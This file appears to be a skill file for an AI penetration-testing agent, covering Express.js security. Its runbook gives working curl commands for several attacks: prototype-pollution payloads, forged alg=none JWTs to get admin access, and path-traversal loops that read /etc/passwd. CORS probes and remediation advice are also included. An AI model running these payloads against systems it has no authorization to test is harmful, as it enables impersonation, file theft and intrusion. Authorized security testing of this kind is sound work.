---
name: express
description: Express.js + Node — prototype pollution, body-parser, helmet defaults, JWT in headers, express-session
triggers: [express, expressjs, node, body-parser, helmet, npm, prototype pollution, jwt header, passport]
---

# Express.js Security

Express is the de-facto Node web framework — minimal core, security via middleware stacking. Bugs cluster around (1) **prototype pollution** (via `body-parser` + qs nested-object parsing), (2) **JWT middleware misuse** (header trust, algorithm confusion), (3) **path-traversal in `express.static`**, (4) **CORS via the `cors` middleware** defaults, and (5) **`express-session` cookie flags** missing.

## Attack Surface

### body-parser + qs (prototype pollution)
- `body-parser` 0.x with `extended: true` (default) uses `qs` for query strings
- `qs` parses nested objects: `?__proto__[isAdmin]=true` → object pollution
- See prototype_pollution.md for the full chain

### Path traversal in `express.static`
- `app.use('/static', express.static('uploads'))` is safe by default
- BUT custom middleware doing `res.sendFile(path.join('uploads', req.params.file))` is NOT
- Path traversal via `../../../etc/passwd` works without normalisation

### JWT middleware (`jsonwebtoken`, `express-jwt`)
- Bug: `jwt.verify(token, secret, {algorithms: ['HS256', 'RS256']})` — RS256 mixed with HS256 = alg confusion
- Bug: token in `Authorization: Bearer` header trusted without HMAC; signature not verified
- Bug: `jwt.decode()` (without verify) used to extract claims = no signature check at all

### CORS middleware
- `cors()` with no options = `Access-Control-Allow-Origin: *`
- `cors({origin: true})` = reflected Origin header → permissive CORS
- `cors({origin: '*', credentials: true})` = forbidden combo but some configs slip past

### express-session
- Default cookie name: `connect.sid` (fingerprint-able)
- Missing `secure: true` → cookie over HTTP
- Missing `httpOnly: true` → JavaScript can read session cookie
- Missing `sameSite: 'lax'` → CSRF surface
- Default in-memory store (MemoryStore) → not production-safe; cookie volatility on restart

### helmet defaults
- `helmet()` ships sensible defaults
- Bug: app uses individual helmet middlewares, forgets one (e.g., `helmet.hsts()` missing)
- Bug: CSP set with `unsafe-inline` / `unsafe-eval` → no script-src protection

### Passport.js strategies
- Bug: `LocalStrategy` callbacks with no password-hash comparison (raw equality)
- Bug: `JwtStrategy` with `secretOrKey` = empty / hardcoded
- Bug: OAuth `StateExempt` — state parameter not enforced

## Detection Channels

### Fingerprint Express
```bash
curl -sI 'https://<TARGET>/' | grep -i 'x-powered-by'
# X-Powered-By: Express → confirmed

# Default 404 message
curl -s 'https://<TARGET>/nonexistent' | grep -i 'cannot get'
# "Cannot GET /nonexistent" = Express default
```

### Body-parser prototype pollution
```bash
# JSON body
curl -X POST 'https://<TARGET>/api/<endpoint>' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"strix"}}'

# qs URL-style
curl 'https://<TARGET>/api/search?__proto__[polluted]=strix'

# Then GET an unrelated endpoint; check if polluted prop appears
curl -s 'https://<TARGET>/api/whoami' | grep 'polluted'
```

### CORS audit
```bash
curl -sI -H 'Origin: https://attacker.com' 'https://<TARGET>/api/me' | \
  grep -iE 'access-control-allow'

# Allow-Origin: attacker.com + Allow-Credentials: true = CORS misconfig
# Allow-Origin: * + Allow-Credentials: true = forbidden combo (browser blocks, but server is permissive)
```

### JWT header trust
```bash
# Mint a JWT with alg=none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '/+' '_-' | tr -d '=')
PAYLOAD=$(echo -n '{"user_id":1,"role":"admin"}' | base64 -w0 | tr '/+' '_-' | tr -d '=')
JWT="${HEADER}.${PAYLOAD}."  # empty signature

curl -s -H "Authorization: Bearer $JWT" 'https://<TARGET>/api/me'
# If app returns user_id:1 / admin context, alg=none is accepted
```

### Session cookie flags
```bash
curl -sI 'https://<TARGET>/' | grep -iE 'set-cookie.*connect\.sid|set-cookie.*session'

# Look for flag presence:
# - HttpOnly: yes / no
# - Secure: yes / no
# - SameSite: lax / strict / none
```

## Operational Runbook

### Step 1 — fingerprint + middleware audit
```bash
# X-Powered-By + 404 page reveals Express
curl -sI 'https://<TARGET>/'

# Helmet hardening tells: typical helmet adds X-DNS-Prefetch-Control,
# X-Frame-Options, X-Content-Type-Options, Referrer-Policy.
# Their absence = no helmet.
curl -sI 'https://<TARGET>/' | grep -iE 'x-dns-prefetch|x-frame-options|x-content-type-options|referrer-policy'
```

### Step 2 — body-parser prototype pollution
```bash
# Drop a pollution probe + confirmation request
curl -X POST 'https://<TARGET>/api/' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}' && \
curl -s 'https://<TARGET>/api/whoami' | jq '.isAdmin'

# Look for "isAdmin: true" in the unrelated request's response → pollution propagated
```

### Step 3 — JWT alg / signature audit
```bash
# Try alg=none
NONE_JWT="$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '/+' '_-' | tr -d '=').$(echo -n '{"sub":"admin"}' | base64 -w0 | tr '/+' '_-' | tr -d '=')."
curl -i -H "Authorization: Bearer $NONE_JWT" 'https://<TARGET>/api/admin'

# Try alg=HS256 with publicly-known RSA pubkey as HMAC secret
# (alg confusion: server thinks RS256, attacker HMACs with the pubkey)
```

### Step 4 — path-traversal in static handlers
```bash
# Common static prefixes
for prefix in /static /public /uploads /assets /files; do
  curl -s "https://<TARGET>${prefix}/../../../../etc/passwd" | head -3
  curl -s "https://<TARGET>${prefix}/..%2f..%2f..%2fetc%2fpasswd" | head -3
done
```

### Step 5 — CORS misconfig
```bash
curl -i -H 'Origin: https://attacker.com' 'https://<TARGET>/api/me'

# Reflective ACAO + ACAC: true = CORS open
# ACAO: null + ACAC: true = attackable via sandboxed iframe
```

### Step 6 — npm dependency CVEs
```bash
# When repo is accessible (source pull / .git/ exposure / GitHub link)
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "critical" or .value.severity == "high")'

# Or use Strix's scan_sca_lockfiles directly
strix scan_sca_lockfiles --target ./
```

## Specific Vulnerability Classes

### `serve-static` + symlink follow
- `express.static` follows symlinks by default
- Pointed at a directory with attacker-placed symlinks → traversal

### `express-fileupload` + RCE
- `express-fileupload` < 1.1.10 had a prototype-pollution RCE (CVE-2020-7699)
- Filename-based traversal pre-1.1.x

### Body-parser DoS
- `app.use(express.json())` with no `limit` option = default 100kb
- `app.use(express.json({limit: '50mb'}))` = DoS via memory exhaustion if attacker submits multi-MB JSON

### `cookie-session` signing
- Uses `keys` array for HMAC; if leaked, full session forgery
- Rotating keys via array append; defenders sometimes forget to remove old keys

### `passport-jwt` `secretOrKey` empty
- `new JwtStrategy({secretOrKey: ''}, callback)` → empty-string HMAC = any token verifies
- Should fail at app startup but doesn't in older versions

## Bypass Techniques

- **Path normalisation**: Express normalises `/api/users/../admin` to `/api/admin`. But `/api/users/..%2fadmin` may not get normalised; URL-decoded later in middleware.
- **Case-insensitive routes**: Express routes are case-sensitive by default; some apps use `app.set('case sensitive routing', false)` then create case-mismatched routes that bypass middleware checks.
- **Trust-proxy misconfig**: `app.set('trust proxy', true)` accepts ALL `X-Forwarded-*` headers; attacker injects `X-Forwarded-For` to bypass IP-based rate limit.

## Validation

1. Prototype pollution: probe fires, polluted prop appears in subsequent request.
2. JWT alg confusion / alg=none: forged token accepted as valid.
3. Path traversal: arbitrary file content returned via static handler.
4. CORS: cross-origin XHR with credentials succeeds.
5. Session cookie missing critical flags: confirm via Set-Cookie header inspection.

## False Positives

- Helmet not present but the app is internal-only (different threat model).
- `X-Powered-By` removed via `app.disable('x-powered-by')` — Express fingerprint hidden but still Express.
- Prototype pollution via probe doesn't propagate — confirm with multi-request test before flagging.
- `connect.sid` cookie missing `secure: true` on a localhost dev environment — not a finding.

## Impact

- Prototype pollution → property-gadget RCE (see prototype_pollution.md).
- JWT bypass → impersonation of any user.
- Path traversal → file read → cred / config leak → broader compromise.
- CORS → credentialed cross-origin abuse → CSRF-equivalent.
- Session cookie flags → CSRF / theft via JS / cross-site replay.

## Remediation

1. **`body-parser` with `extended: false`** OR upgrade `qs` ≥ 6.10.1 (CVE-2022-24999).
2. **JWT middleware: explicit allow-list of algorithms** + no `jwt.decode()` for trust decisions.
3. **`express.static` with `dotfiles: 'deny'` + no symlink-follow**.
4. **`cors()` with explicit `origin` allow-list**, never `origin: true` in production.
5. **`express-session` with secret from env, `secure: true`, `httpOnly: true`, `sameSite: 'lax'`** + Redis / database session store.
6. **`helmet()` at the top of middleware stack**.
7. **`npm audit fix --production`** in CI; fail build on high-severity findings.

## Pro Tips

1. `X-Powered-By: Express` is a strong fingerprint; `app.disable('x-powered-by')` is rare but defenders sometimes do it.
2. The default 404 "Cannot GET /path" is gone in production when an error-handler middleware is mounted.
3. `connect.sid` is the canonical cookie name; missing implies the app rolled its own session interface.
4. `body-parser` is deprecated as separate package in Express 4.16+; `express.json()` and `express.urlencoded()` replace it but have the same prototype-pollution surface.
5. Prototype pollution + Express + `child_process` execution = RCE in 3 steps; see prototype_pollution.md.

## Summary

Express security is middleware-stack discipline. Body-parser prototype pollution, JWT misuse, static-handler traversal, CORS defaults, session-cookie flags. Helmet helps; defaults rarely save you.
